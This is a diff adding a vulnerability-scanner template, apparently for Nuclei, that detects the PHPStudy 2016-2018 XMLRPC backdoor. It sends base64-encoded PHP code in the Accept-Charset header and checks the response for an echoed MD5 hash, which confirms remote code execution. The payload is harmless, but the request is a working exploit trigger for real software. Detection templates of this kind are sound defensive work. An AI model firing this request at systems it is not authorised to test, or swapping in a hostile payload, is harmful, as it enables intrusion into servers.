@@ -1,0 +1,37 @@
+id: phpstudy-xmlrpc-backdoor-rce
+info:
+  name: PHPStudy XMLRPC Backdoor RCE Detection
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Detects the presence of a backdoor in PHPStudy XMLRPC module by exploiting a vulnerability that allows remote code execution.
+  reference:
+    - https://www.freebuf.com/column/214946.html
+  metadata:
+    affected_version: phpstudy 2016-phpstudy 2018 php 5.2 php 5.4
+
+variables:
+  random_string: "{{rand_text_alphanumeric(6)}}"
+  payload: "{{base64(concat('printf(md5(', random_string, '));'))}}"
+
+http:
+  - raw:
+      - |
+        GET /index.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept-Charset: {{payload}}
+        Accept-Encoding: gzip,deflate
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "{{md5(random_string)}}"
+      - type: status
+        status:
+          - 200
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "{{md5(random_string)}}"
